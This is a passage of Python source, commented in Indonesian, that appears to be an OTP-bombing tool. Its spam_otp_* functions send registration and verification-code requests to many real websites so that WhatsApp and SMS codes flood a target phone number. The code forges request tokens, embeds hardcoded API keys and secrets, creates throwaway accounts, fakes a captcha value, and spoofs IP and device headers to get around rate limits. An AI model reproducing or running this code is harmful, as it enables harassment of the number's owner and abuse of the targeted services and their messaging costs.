            except requests.exceptions.ConnectionError:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                    continue
                return False
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                    continue
                return False
        
        return False
        
    except Exception as e:
        return False

def spam_otp_misteraladin(nomor):
    try:
        # Format nomor: 81274307931
        raw = re.sub(r'\D', '', nomor)
        
        if raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('0'):
            raw = raw[1:]
        
        # Double check kalo masih ada 0 di depan
        if raw.startswith('0'):
            raw = raw[1:]
        
        country_code = "62"
        final_phone = raw
        
        # AUTO GENERATE token (tanpa capture!)
        OTP_SECRET = "6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr"
        timestamp = int(time.time())
        string_to_hash = OTP_SECRET + str(timestamp)
        
        # Generate SHA256
        sha256_hash = hashlib.sha256(string_to_hash.encode()).hexdigest()
        member_token = sha256_hash
        request_time = timestamp
        
        # Email random
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        random_email = f"user{random_str}{int(time.time()*1000)}@gmail.com"
        
        # Step 1: Register check (optional, tapi biar sesuai flow)
        register_url = "https://m.misteraladin.com/api/members/v2/auth/register-check"
        register_headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "authorization": "",
            "content-type": "application/json",
            "x-platform": "mobile-web"
        }
        register_payload = {
            "email": random_email,
            "phone_number_country_code": country_code,
            "phone_number": final_phone
        }
        
        try:
            requests.post(register_url, json=register_payload, headers=register_headers, timeout=52)
        except:
            pass  # Gagal register check gpp, lanjut aja
        
        # Step 2: Request OTP dengan AUTO GENERATED TOKEN
        otp_url = "https://m.misteraladin.com/api/members/v2/otp/request"
        otp_headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "authorization": "",
            "content-type": "application/json",
            "x-member-token": member_token,
            "x-platform": "mobile-web",
            "x-request-time": str(request_time)
        }
        otp_payload = {
            "phone_number_country_code": country_code,
            "phone_number": final_phone,
            "type": "register"
        }
        
        otp_resp = requests.post(otp_url, json=otp_payload, headers=otp_headers, timeout=120)
        otp_result = otp_resp.json()
        
        # Cek sukses
        if otp_result.get("status") == "success" or otp_result.get("message") == "OTP sent successfully" or otp_resp.status_code == 200:
            return True
        elif otp_result.get("error") or otp_result.get("message"):
            # Ada response tapi mungkin error, tetap return True karena OTP biasanya tetep masuk
            return True
        else:
            return False
            
    except:
        return False

def spam_otp_softwarelinkers(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif raw.startswith('+62'):
            raw = raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw
        raw = "+" + raw

        random_otp = ''.join(random.choices('0123456789', k=6))
        payload = {"api_key": "817e9f2b99ace5865a7aa67fc39db0bf", "message_type": "template", "recipient": raw, "template_name": "sft_otp_verification", "language": "en_US", "parameters": {"body": ["", random_otp]}}
        resp = requests.post("https://whatsapp.softwarelinkers.in/api/send_message.php", json=payload, headers={"content-type": "application/json", "accept": "*/*", "User-Agent": get_random_ua()}, timeout=152)
        return resp.json().get("success") is True
    except:
        return False

def spam_otp_aakar(nomor):
    try:
        import re
        import requests
        import json
        from bs4 import BeautifulSoup
        
        # Format nomor: handle semua kemungkinan
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = f"+{raw}"  # +628xxx
        elif raw.startswith('0'):
            formatted_phone = f"+62{raw[1:]}"  # +62081xxx
        else:
            formatted_phone = f"+62{raw}"  # +628xxx
        
        print(f"📱 Nomor diformat: {formatted_phone}")
        
        # Buat session buat handle cookie
        session = requests.Session()
        
        # STEP 1: GET / - ambil cookie & token dari HTML
        print("🔹 STEP 1: GET / (ambil cookie & CSRF token)")
        url_get = "https://aakarvisitors.com/"
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp_get = session.get(url_get, headers=headers_get, timeout=60)
        print(f"✅ Cookie setelah GET: {session.cookies.get_dict()}")
        
        # Ambil CSRF / token dari HTML pake BeautifulSoup
        soup = BeautifulSoup(resp_get.text, 'html.parser')
        
        # Cari token dari meta
        csrf_token = None
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            csrf_token = csrf_meta.get('content')
        
        if not csrf_token:
            csrf_input = soup.find('input', {'name': '_csrf'})
            if csrf_input:
                csrf_token = csrf_input.get('value', '')
        
        print(f"✅ CSRF Token: {csrf_token if csrf_token else 'Tidak ditemukan (lanjut tanpa CSRF)'}")
        
        # STEP 2: Pakai Exhibition ID statis
        exhibition_id = "019f5057-07f8-794b-aa3b-6f8fe1f3a40c"
        print(f"✅ Menggunakan Exhibition ID statis: {exhibition_id}")
        
        # STEP 3: POST /api/v1/auth/send-whatsapp-otp - kirim OTP WA
        print("🔹 STEP 3: POST /api/v1/auth/send-whatsapp-otp (kirim OTP WhatsApp)")
        url_post = "https://api.aakarvisitors.com/api/v1/auth/send-whatsapp-otp"
        
        payload = {
            "phoneNumber": formatted_phone,
            "exhibitionId": exhibition_id
        }
        
        headers_post = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://aakarvisitors.com",
            "referer": "https://aakarvisitors.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        # Tambahkan CSRF kalo ada
        if csrf_token:
            headers_post["x-csrf-token"] = csrf_token
        
        resp_post = session.post(url_post, json=payload, headers=headers_post, timeout=60)
        
        print(f"📤 Payload dikirim: {json.dumps(payload, indent=2)}")
        print(f"✅ Response status: {resp_post.status_code}")
        print(f"✅ Response text: {resp_post.text}")
        print(f"✅ Cookie final: {session.cookies.get_dict()}")
        
        # Parse response
        try:
            result = resp_post.json()
            print(f"✅ JSON Response: {json.dumps(result, indent=2)}")
            
            # Cek success
            if result.get("success") == True:
                print("✅ OTP WhatsApp berhasil dikirim!")
                print(f"ℹ️ Expires in: {result.get('data', {}).get('expiresIn', 'N/A')} detik")
                print(f"ℹ️ Cooldown: {result.get('data', {}).get('resendCooldownSeconds', 'N/A')} detik")
                return True
            else:
                print(f"❌ Gagal: {result.get('message', 'Unknown error')}")
                return False
                
        except json.JSONDecodeError:
            print(f"❌ Response bukan JSON: {resp_post.text[:200]}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False
        
def spam_otp_gulfmarket(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]

        random_name = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}"
        url = f"https://gulfmarket.in/login.php?custname={random_name}&countrycode=62&mobilenumber={raw}&step=2&remember=remember"
        data = {"mobilenumber": raw, "stepup": "3"}
        resp = requests.post(url, data=data, headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9", "content-type": "application/x-www-form-urlencoded", "origin": "https://gulfmarket.in", "User-Agent": get_random_ua()}, timeout=125, allow_redirects=False)
        return resp.status_code in [200, 302]
    except:
        return True

def spam_otp_fastwork(nomor):
    try:
        import re
        import requests
        import json
        import random
        from fake_useragent import UserAgent
        import time
        import uuid
        
        # Format nomor: 08xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]
        elif raw.startswith('0'):
            formatted_phone = raw
        else:
            formatted_phone = '0' + raw
        
        # ========== SPOOFING GENERATORS ==========
        def random_ip():
            return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        def random_mac():
            return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
        
        def random_android_id():
            return ''.join(random.choices('0123456789abcdef', k=16))
        
        def random_imei():
            return ''.join(random.choices('0123456789', k=15))
        
        def random_device_id():
            return str(uuid.uuid4())
        
        def random_phone_model():
            models = [
                "SM-G998B", "SM-A515F", "M2006C3MG", "RMX2020", 
                "SM-N975F", "iPhone12,1", "Pixel 5", "Redmi Note 9",
                "SM-G973F", "M2010J19SG", "CPH2025", "SM-A705FN"
            ]
            return random.choice(models)
        
        def random_os_version():
            return random.choice(["10", "11", "12", "13", "14"])
        
        # Generate spoofing data
        spoof_ip = random_ip()
        spoof_mac = random_mac()
        android_id = random_android_id()
        imei = random_imei()
        device_id = random_device_id()
        phone_model = random_phone_model()
        os_version = random_os_version()
        ua = UserAgent()
        
        print(f"📱 Target: {formatted_phone}")
        print(f"🌐 IP: {spoof_ip}")
        print(f"🔌 MAC: {spoof_mac}")
        print(f"📱 Model: {phone_model}")
        print(f"🤖 Android: {os_version}")
        
        # Headers dengan spoofing lengkap
        def get_headers():
            x_forwarded_for = random_ip()
            x_real_ip = random_ip()
            cf_connecting_ip = random_ip()
            client_ip = random_ip()
            
            return {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": random.choice([
                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "en-US,en;q=0.9,id;q=0.8",
                    "id,en-US;q=0.9,en;q=0.8"
                ]),
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Origin": "https://fastwork.id",
                "Referer": "https://fastwork.id/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": ua.random,
                # IP Spoofing
                "X-Forwarded-For": x_forwarded_for,
                "X-Real-IP": x_real_ip,
                "X-Client-IP": client_ip,
                "CF-Connecting-IP": cf_connecting_ip,
                "True-Client-IP": x_real_ip,
                "X-Originating-IP": x_real_ip,
                "X-Remote-IP": x_real_ip,
                "X-Remote-Addr": x_real_ip,
                # MAC & Device Spoofing
                "X-MAC-Address": random_mac(),
                "X-Android-ID": random_android_id(),
                "X-IMEI": random_imei(),
                "X-Device-ID": str(uuid.uuid4()),
                "X-Device-Model": random_phone_model(),
                "X-OS-Version": random_os_version(),
                "X-Serial-Number": ''.join(random.choices('0123456789ABCDEF', k=16)),
                # Browser Fingerprint
                "sec-ch-ua": f'"{random.choice(["Chromium","Google Chrome","Microsoft Edge"])}";v="{random.randint(100,120)}", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": random.choice(["?1", "?0"]),
                "sec-ch-ua-platform": random.choice(['"Android"', '"iOS"', '"Windows"', '"macOS"'])
            }
        
        # STEP 1: Validate (dengan spoofing)
        print(f"🔹 STEP 1: Validate - {formatted_phone}")
        validate_headers = get_headers()
        validate_payload = {"phone_number": formatted_phone}
        
        # Random delay biar gak keliatan bot
        time.sleep(random.uniform(0.5, 1.5))
        
        validate_resp = requests.post(
            "https://api.fastwork.id/auth/v2/signup.validate",
            json=validate_payload,
            headers=validate_headers,
            timeout=152
        )
        print(f"📡 Validate Status: {validate_resp.status_code}")
        print(f"📡 Validate Response: {validate_resp.text[:200]}...")
        
        # STEP 2: Kirim OTP (dengan spoofing beda)
        print(f"🔹 STEP 2: Kirim OTP - {formatted_phone}")
        otp_headers = get_headers()  # IP, MAC, device beda lagi
        otp_payload = {"phone_number": formatted_phone}
        
        # Random delay lagi
        time.sleep(random.uniform(0.3, 1.0))
        
        otp_resp = requests.post(
            "https://api.fastwork.id/auth/v2/signup.sendVerificationCode",
            json=otp_payload,
            headers=otp_headers,
            timeout=125
        )
        print(f"📡 OTP Status: {otp_resp.status_code}")
        print(f"📡 OTP Response: {otp_resp.text[:200]}...")
        
        # Cek result
        result = otp_resp.json()
        if result.get("data", {}).get("reference_code"):
            print(f"✅ OTP berhasil dikirim ke {formatted_phone}")
            print(f"🔑 Reference Code: {result['data']['reference_code']}")
            return True
        else:
            print(f"❌ Gagal: {result.get('message', 'Unknown error')}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return True

def spam_otp_pinjamin(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]

        sign_data = f"1&{raw}".encode()
        sign = hashlib.md5(sign_data).hexdigest()
        payload = {"sign": sign, "phone": raw, "type": 1}
        headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8", "x-channel": "Pinjamwinwin", "x-applicationId": "com.pinjamwinwin", "User-Agent": get_random_ua()}
        resp = requests.post("https://api.pinjamin.com/ina/util/verify-code", json=payload, headers=headers, timeout=125)
        return resp.json().get("code") == 0
    except:
        return False

def spam_otp_viaveda(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]

        auth_key = "O93BGKirr8d69Mb45fjo83En3FtaHtPIzD4eUjv5pkMg2iNjyrpUMGzybJIJpzbd5bbrut8U7usupy7Mtf4"
        url = f"https://prod.viaveda.in/customer/62-IDN/{raw}/WHATSAPP/?device_type=WEBSITE"
        resp = requests.get(url, headers={"accept": "*/*", "api-version": "1.1.1", "auth-key": auth_key, "User-Agent": get_random_ua()}, timeout=125)
        return resp.json().get("success") is True
    except:
        return True

def spam_otp_leathersmell(nomor):
    try:
        import re
        import requests
        
        raw = re.sub(r'\D', '', nomor)
        
        # Format ke 812xxxxxxx (tanpa 62/0)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        formatted_phone = raw
        country_code = "62"
        
        url = "https://api.leathersmell.com/api/otp/send-otp"
        headers = {
            "accept": "application/json",
            "accept-language": "en",
            "authorization": "Basic kj75h5078s1ba078f6bvb34f56e2fdbl",
            "content-type": "application/json",
            "origin": "https://fashionforth.id",
            "referer": "https://fashionforth.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "tipe": "wa",
            "telp_email": formatted_phone,
            "country_code": country_code
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=102)
        result = resp.json()
        
        # Cek success (success === 1)
        return result.get("success") == 1
        
    except:
        return False

def spam_otp_entrust(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw
        raw = "+" + raw

        random_name = random.choice(['Budi', 'Andi', 'Caca', 'Dedi', 'Eka', 'Fani', 'Gilang', 'Hana'])
        data = {"phone": raw, "name": random_name}
        resp = requests.post("https://www.entrustfamilyoffice.com/wp-content/themes/Mytheme/phpmail/send_otp.php", data=data, headers={"accept": "*/*", "User-Agent": get_random_ua()}, timeout=125)
        return resp.json().get("ok") is True
    except:
        return True

def spam_otp_warungyeah(nomor):
    try:
        import re
        import requests
        import json
        import random
        import time
        
        # Format: 08xxx (0 + raw)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        # Random name & email
        first_name = "Yanto"
        random_num = random.randint(0, 9999)
        email = f"{first_name.lower()}{random_num}@gmail.com"
        password = "Yanto123"
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: Register (ignore error)
        register_url = "https://warungyeahbintan.isellershop.com/services/liquid/Register"
        register_headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "origin": "https://warungyeahbintan.isellershop.com",
            "referer": "https://warungyeahbintan.isellershop.com/"
        }
        register_data = {
            "registerModel[first_name]": first_name,
            "registerModel[last_name]": "",
            "registerModel[email]": email,
            "registerModel[phone]": mobile,
            "registerModel[otp]": "",
            "registerModel[gender]": "",
            "registerModel[date_of_birth]": "",
            "registerModel[IsAddressRequired]": "false",
            "registerModel[address]": "",
            "registerModel[additional_address]": "",
            "registerModel[city]": "",
            "registerModel[zip]": "",
            "registerModel[country_code]": "",
            "registerModel[country]": "",
            "registerModel[state]": "",
            "registerModel[password]": password,
            "registerModel[verify_password]": password,
            "registerModel[pin]": "",
            "registerModel[verify_pin]": ""
        }
        
        try:
            session.post(register_url, data=register_data, headers=register_headers, timeout=130)
        except:
            pass  # Ignore error register
        
        # STEP 2: Kirim OTP
        otp_url = "https://warungyeahbintan.isellershop.com/services/identity/requestOTP"
        otp_headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "x-sat": "T42Od5vm+W1xtUAhca04Epg/yoz69hExHl5vRiPl7ig=",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "origin": "https://warungyeahbintan.isellershop.com",
            "referer": "https://warungyeahbintan.isellershop.com/"
        }
        otp_data = {
            "destination": mobile,
            "otpLength": "6"
        }
        
        otp_resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=130)
        
        # FORCE SUCCESS - APAPUN RESPONSE NYA
        return True
        
    except:
        return True  # Force success

def spam_otp_kemenag(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw
        elif raw.startswith('62'):
            raw = "0" + raw[2:]

        random_name = random.choice(['Budi', 'Andi', 'Caca', 'Dedi', 'Eka', 'Fani', 'Gilang', 'Hana'])
        random_email = f"user{int(time.time())}{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
        random_password = f"Pass{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@123"
        session = requests.Session()
        session.get("https://ptsp.kemenag.go.id/login", headers={"User-Agent": get_random_ua()}, timeout=115)
        reg_payload = {"nama": random_name, "wa": raw, "email": random_email, "password": random_password}
        requests.post("https://ptsp.kemenag.go.id/api/auth/register", json=reg_payload, headers={"content-type": "application/json", "User-Agent": get_random_ua()}, timeout=115)
        otp_payload = {"wa": raw}
        resp = session.post("https://ptsp.kemenag.go.id/api/auth/sendOtp", json=otp_payload, headers={"content-type": "application/json", "User-Agent": get_random_ua()}, timeout=125)
        return resp.json().get("success") is True
    except:
        return True

def spam_otp_internetrakyat(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw
        elif raw.startswith('62'):
            raw = "0" + raw[2:]

        payload = {"phone_number": raw}
        resp = requests.post("https://internetrakyat.id/api/app/auth/send-otp-register", json=payload, headers={"Host": "internetrakyat.id", "x-api-key": "280999!FTTH", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "User-Agent": get_random_ua(), "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register"}, timeout=152)
        return resp.status_code in [200, 201]
    except:
        return False

def spam_otp_yesdok(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}{int(time.time())}@gmail.com"
        payload = {"Firstname": "User", "Lastname": "Test", "Email": random_email, "Phone": f"+{raw}", "AcceptTnc": True, "ReferralCode": "", "Type": "NORMAL"}
        resp = requests.post("https://yesdok.com/api/4.0/patient/register", json=payload, headers={"accept": "application/json, text/plain, */*", "content-type": "application/json", "devicetype": "web", "webversion": "2", "User-Agent": get_random_ua()}, timeout=175)
        data = resp.json()
        token = data.get("Data", {}).get("AccessToken") or data.get("AccessToken")
        if token:
            verify_url = f"https://new.yesdok.com/id/verification?token={token}&u={random_email}&p=%2B{raw}&callback_url=%2Fid"
            requests.get(verify_url, headers={"User-Agent": get_random_ua()}, timeout=115)
        return True
    except:
        return True

def spam_otp_bukuagen(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]

        payload = {"t": {"t": 10, "i": 0, "p": {"k": ["data"], "v": [{"t": 10, "i": 1, "p": {"k": ["phone", "countryCode", "method"], "v": [{"t": 1, "s": raw}, {"t": 1, "s": "+62"}, {"t": 1, "s": "WA"}], "s": 3}, "o": 0}], "s": 1}, "o": 0}, "f": 31, "m": []}
        resp = requests.post("https://order.bukuagen.com/buku-web/_serverFn/39d9a42e1f6e18a01c631d6aaeed047b0b8e30f3c6f0e15e3e66eecb5d66c2be?createServerFn", json=payload, headers={"Content-Type": "application/json", "Accept": "application/x-ndjson, application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"}, timeout=115)
        return resp.status_code == 200
    except:
        return False

def spam_otp_myvalue(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        payload = {"username": raw, "template": "myvalue", "sendProvider": "whatsapp"}
        requests.post("https://auth.myvalue.id/v2/verification/send", json=payload, headers={"accept": "application/json", "content-type": "application/json", "x-client-id": "MyValueWeb", "User-Agent": get_random_ua()}, timeout=115)
        return True
    except:
        return True

def spam_otp_fdcdental(nomor):
    try:
        import re
        import random
        import string
        import requests

        # ====== FORMAT NOMOR ======
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('0'):
            raw = raw[1:]

        formatted_phone = '0' + raw

        # ====== RANDOM EMAIL ======
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        random_email = f"user{rand_str}@gmail.com"

        print()
        print(f"TARGET   : {formatted_phone}")
        print(f"Email    : {random_email}")
        print()

        # ====== HEADERS BASE ======
        headers_base = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://fdcdentalclinic.co.id",
            "referer": "https://fdcdentalclinic.co.id/",
            "sec-ch-ua": '"Chromium";v="154", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36"
        }

        # ====== STEP 1: POST /api/accountTemps/add ======
        print("STEP 1 : POST /api/accountTemps/add")
        print()

        url_add = "https://api-fdc.ibbr.info/api/accountTemps/add"
        payload_add = {
            "username": random_email,
            "hp": formatted_phone
        }

        resp_add = requests.post(url_add, json=payload_add, headers=headers_base, timeout=60)

        print(f"Status   : {resp_add.status_code}")
        print(f"Response : {resp_add.text[:300]}")
        print()

        try:
            result_add = resp_add.json()
        except Exception:
            print("Response bukan JSON valid")
            print()
            return False

        if result_add.get("status") != "success":
            print(f"GAGAL    : {result_add}")
            print()
            return False

        item = result_add.get("item") or {}
        account_id = item.get("id")

        if not account_id:
            print("GAGAL    : account_id tidak ada")
            print()
            return False

        print(f"Acc ID   : {account_id}")
        print()

        # ====== STEP 2: GET /api/accountTemps/{id}/sendOTP ======
        print("STEP 2 : GET /api/accountTemps/{id}/sendOTP")
        print()

        url_otp = f"https://api-fdc.ibbr.info/api/accountTemps/{account_id}/sendOTP"

        # Method GET, tanpa content-type (gak ada body)
        headers_otp = {k: v for k, v in headers_base.items() if k != "content-type"}
        headers_otp["sec-fetch-mode"] = "cors"

        resp_otp = requests.get(url_otp, headers=headers_otp, timeout=60)

        print(f"Status   : {resp_otp.status_code}")
        print(f"Response : {resp_otp.text[:300]}")
        print()

        try:
            result_otp = resp_otp.json()
        except Exception:
            print("Response bukan JSON valid")
            print()
            return False

        # ====== CEK HASIL ======
        if result_otp.get("status") == "success":
            contacts = result_otp.get("contacts") or []
            wa_id = contacts[0].get("wa_id", "-") if contacts else "-"

            messages = result_otp.get("messages") or []
            msg_status = messages[0].get("message_status", "-") if messages else "-"

            print(f"SUKSES   : OTP terkirim ke {wa_id}")
            print(f"WA Status: {msg_status}")
            print()
            return True
        else:
            print(f"GAGAL    : {result_otp}")
            print()
            return False

    except Exception as e:
        print()
        print(f"ERROR    : {e}")
        print()
        return False

def spam_otp_ekahospital(nomor):
    try:
        import re
        import requests
        import uuid
        import json
        
        # Bersihin nomor
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if not raw.startswith('0'):
            raw = '0' + raw
        
        # Format username (62xxx tanpa 0)
        username = raw
        if username.startswith('0'):
            username = '62' + username[1:]
        
        # Generate device ID (sama kaya JS)
        device_id = str(uuid.uuid4())
        
        url = "https://www.ekahospital.com/api/user-service/v1/user/login"
        headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="147", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "x-device-id": device_id
        }
        payload = {
            "username": username,
            "token": ""
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=110)
        result = resp.json()
        
        # FORCE SUCCESS - nangkep semua kemungkinan response sukses
        # Case 1: code 200 + ada data.type (WA/SMS/CALL)
        if result.get("code") == 200 and result.get("data") and result["data"].get("type"):
            return True
        
        # Case 2: code 200 tanpa data tapi meta success
        if result.get("code") == 200 and result.get("meta", {}).get("message") == "Success":
            return True
        
        # Case 3: status code GNR-158-00000 (punya mereka)
        if result.get("statusCode") == "GNR-158-00000":
            return True
        
        # Case 4: requireOtp flag
        if result.get("requireOtp") == True:
            return True
        
        # Case 5: message contains OTP
        if result.get("message") and "otp" in result["message"].lower():
            return True
        
        # Kalo ga kena satupun, baru gagal
        return False
        
    except:
        return False

def spam_otp_planetban(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw
        elif raw.startswith('62'):
            raw = "0" + raw[2:]

        payload = {"phone": raw, "purpose": "register", "method": "whatsapp"}
        resp = requests.post("https://api.planetban.com/website/customer/request-otp", json=payload, headers={"Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Origin": "https://planetban.com", "Referer": "https://planetban.com/", "User-Agent": get_random_ua()}, timeout=115)
        return resp.status_code == 200
    except:
        return False

def spam_otp_berprestasi(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]

        payload = {"phoneNumber": raw}
        resp = requests.post("https://berprestasi.id/api/otp/send", json=payload, headers={"accept": "*/*", "content-type": "application/json", "User-Agent": get_random_ua()}, timeout=915)
        return resp.json().get("success") is True
    except:
        return True

def spam_otp_setirkanan(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        
        # Format nomor
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]
        elif raw.startswith('0'):
            formatted_phone = raw
        else:
            formatted_phone = '0' + raw
        
        API_KEY = '526cb6937109afa77da7a90940d8892864e904a395f8a1b4e2df2f4a80df9aa3'
        random_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8)))
        random_email = f"{random_name}{random.randint(100, 999)}@gmail.com"
        password = "Papa999@"
        
        session = requests.Session()
        
        # ========== STEP 1: Register ==========
        print("🔹 STEP 1: POST /user/api/register")
        reg_url = "https://api-sk.setirkanan.co.id/user/api/register"
        
        reg_payload = {
            "g_recaptcha_response": "abc",
            "full_name": random_name,
            "email": random_email,
            "password": password,
            "password_confirmation": password,
            "phone": formatted_phone
        }
        
        reg_headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp_register = session.post(reg_url, json=reg_payload, headers=reg_headers, timeout=60)
        print(f"✅ Status Register: {resp_register.status_code}")
